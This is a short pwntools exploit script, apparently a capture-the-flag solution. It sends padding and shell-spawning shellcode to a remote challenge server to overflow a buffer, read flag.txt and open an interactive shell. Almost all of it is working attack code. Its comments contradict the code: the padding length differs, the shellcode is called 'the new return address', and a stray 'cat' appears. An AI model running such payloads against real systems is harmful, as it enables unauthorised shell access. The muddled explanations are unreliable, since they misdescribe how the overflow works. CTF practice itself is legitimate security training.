from pwn import *

# Create a process for the vulnerable program
# exe = ELF('restricted_shell')cat 

context.log_level = 'debug'
p = remote('shell.challs.cyberchallenge.it', 9123)

# Shellcode that opens a shell
shellcode = asm(shellcraft.sh() + shellcraft.cat('flag.txt'))

# Create the payload
# 'A' * 44 is to fill the buffer and overwrite the saved EBP
# shellcode is the new return address, replace it with the address of your shellcode
payload = b'A' * 40 + shellcode

# Send the payload
p.sendline(payload)



p.clean()


# Interact with the process
p.interactive()

p.close()